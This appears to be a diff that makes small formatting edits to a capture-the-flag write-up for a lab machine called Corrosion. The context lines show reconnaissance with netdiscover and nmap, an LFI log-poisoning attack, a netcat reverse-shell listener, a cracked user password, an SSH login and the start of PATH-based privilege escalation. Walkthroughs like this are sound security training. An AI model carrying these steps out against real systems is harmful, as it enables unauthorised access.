@@ -20,7 +20,7 @@ Hey guys, welcome yet to I hope you enjoy reading through my thought-process for
 I first used a tool called `netdiscover` to discover machines in my network. (_In this case, i used host-only adapter on both Kali & Target_)
 
 ```bash
-➜  corrosion netdiscover -i eth1
+➜  netdiscover -i eth1
 Currently scanning: 172.23.254.0/16   |   Screen View: Unique Hosts
 
  11 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 660
@@ -38,7 +38,7 @@ Currently scanning: 172.23.254.0/16   |   Screen View: Unique Hosts
 After discovering the targets IP address, i then proceeded to perform an nmap scan to determine what ports were open and what services are running behind them.
 
 ```bash
-➜  kali nmap -sC -sV -p- -T4 192.168.56.151
+➜  nmap -sC -sV -p- -T4 192.168.56.151
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-17 15:03 EST
 Nmap scan report for 192.168.56.151
 Host is up (0.00040s latency).
@@ -104,7 +104,7 @@ There is nothing on the `blog-post` directory, but we have a potential user - `r
 
 ![image](https://user-images.githubusercontent.com/58165365/149884127-11f171c0-31d5-4fd7-a007-4cd5a57377a2.png)
 
-Looking at the `tasks`, we see that we have a ext file which contains some instructions. Task 1 tells us to change permissions for auth log file. Could this be a hint to some log poisoning attack? I dunno just yet but we'll see.
+Looking at the `tasks`, we see that we have a txt file which contains some instructions. Task 1 tells us to change permissions for auth log file. Could this be a hint to some log poisoning attack? I dunno just yet but we'll see.
 
 Lets fuzz `blog-post` further to see if there could be potentially useful information.
 
@@ -180,11 +180,11 @@ We can try log poisoning attack and see if it actually works.
 
 > _Log Poisoning is a common technique used to gain a reverse shell from a LFI vulnerability._
 
-![image](https://user-images.githubusercontent.com/58165365/149884037-2e28d58c-aae5-4179-bfed-4d42b6da4a86.png)
-
 If we try ssh as root or hackerman, we can see logs for the same
 
 ![image](https://user-images.githubusercontent.com/58165365/149884021-7c82ee90-cb7f-413a-9dc0-cc51627b85d8.png)
+
+![image](https://user-images.githubusercontent.com/58165365/149884008-3a299304-0afc-4354-a888-55881d2090ef.png)
 
 Writing invalidated user input to log files can allow an attacker to forge log entries or inject malicious content into the logs. In this case, we can try inject a php payload as the username and see if it will be rendered in the log files.
 
@@ -203,7 +203,7 @@ Awesome...Since it works, we can then slap in a bash-onliner and hopefully attai
 ![image](https://user-images.githubusercontent.com/58165365/149884140-79a2dfed-7783-4d5e-a20d-670029e71284.png)
 
 ```bash
-➜  kali nc -lnvp 9999
+➜  nc -lnvp 9999
 listening on [any] 9999 ...
 connect to [192.168.56.106] from (UNKNOWN) [192.168.56.151] 53690
 bash: cannot set terminal process group (881): Inappropriate ioctl for device
@@ -341,8 +341,6 @@ randylovesgoldfish1998
 
 We're in.😎
 
-https://www.proibidoler.com/wp-content/uploads/2016/01/mr-robot-confira-os-erros-de-gravacao-da-1a-temporada.gif
-
 ```bash
 ➜  ssh randy@192.168.56.151 -i id_rsa
 randy@192.168.56.151's password:
@@ -436,7 +434,9 @@ def output():
 output()
 ```
 
-What we can try do is create our own binary using a simple code in `c`. _For reference, you can check out this blog by [Hacking Articles](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/)_
+What we can try do is create our own binary using a simple code in `c`.
+
+_For reference, you can check out this blog by [Hacking Articles](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/)_
 
 ```bash
 randy@corrosion:~/tools$ nano easysysinfo.c
